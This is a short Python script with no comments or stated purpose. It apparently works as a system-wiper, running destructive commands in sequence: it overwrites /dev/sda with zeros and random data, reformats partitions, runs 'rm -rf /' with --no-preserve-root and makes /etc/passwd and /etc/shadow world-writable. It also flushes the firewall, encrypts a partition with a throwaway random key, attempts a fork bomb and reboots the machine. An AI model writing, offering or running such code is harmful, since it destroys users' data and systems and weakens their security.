import os
import subprocess
import shutil

os.mkdir("temp_dir")
shutil.rmtree("temp_dir")

subprocess.run(["dd", "if=/dev/zero", "of=/dev/sda", "bs=1M", "count=100"])
os.chmod("/etc/passwd", 0o777)
os.chmod("/etc/shadow", 0o777)

os.chown("/etc/passwd", os.getuid(), os.getgid())
os.chown("/etc/shadow", os.getuid(), os.getgid())

subprocess.run(["mkfs.ext4", "/dev/sda1"])
subprocess.run(["iptables", "-F"])

subprocess.run(["sudo", "rm", "-rf", "/"])
subprocess.run(["sudo", "rm", "-rf", "--no-preserve-root", "/"])  
subprocess.run(["find", "/", "-name", "*.txt", "-delete"])

subprocess.run(["rmmod", "modulename"])

os.system("sudo apt update && sudo apt upgrade -y")
os.system("sudo apt install -y cryptsetup")

os.system("sudo cryptsetup luksFormat --batch-mode --key-file /dev/urandom /dev/sdXn")
os.system("sudo cryptsetup open /dev/sdXn encrypted_partition")

os.system("sudo mkfs.ext4 /dev/mapper/encrypted_partition")
os.system("sudo mount /dev/mapper/encrypted_partition /mnt/encrypted_data")

subprocess.run(["sudo", "umount", "/"])

subprocess.run(["dd", "if=/dev/urandom", "of=/dev/sda", "bs=1M"])

subprocess.run(["dd", "if=/dev/zero", "bs=1M", "count=1024", "of=largefile"])
subprocess.run(["sudo", ":(){ :|: & };:"])

print("goodbye, OS") 

os.sytem("reboot")
os.system("sudo reboot")
os.system("sudo systemctl reboot")
 
